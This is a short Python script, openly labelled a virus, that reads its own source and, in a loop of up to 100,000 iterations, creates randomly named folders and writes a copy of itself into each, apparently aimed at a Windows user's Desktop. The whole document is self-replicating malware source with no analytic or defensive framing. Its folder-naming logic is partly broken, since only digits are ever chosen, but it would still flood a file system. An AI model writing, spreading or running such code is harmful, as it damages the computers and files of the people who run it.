import os 
import random 

script= __file__

File =open(script,'r')
Virus_Code= File.read()
File.close()

user = os.getlogin()
location = r'C:\Users\{0}\Desktop\\'.format(user)

def Replicate(Folder):
    os.chdir(Folder)
    File=open("Rep_virus.py","w+")
    File.write(Virus_Code)
    File.close()
    os.chdir(location)

x=0
for n in range(100):
    Replication_Amount=100000
    Alpha='zxcvbn'
    Digits='1234567890'
    lenght=[2,4,6,8,10]


for Replication in range(Replication_Amount):
    len= random.choice(lenght)
    Alpha_count=0
    Hexa=''

    for a in range(len):
        if Alpha_count!=0:
            Alpha_count+=1
            Hexa += random.choice(Alpha)
        else:
            Hexa+= random.choice(Digits)
    
    try:
        os.mkdir(Hexa)
        Replicate(Hexa)
    except Exception as Error:
        print(Error)
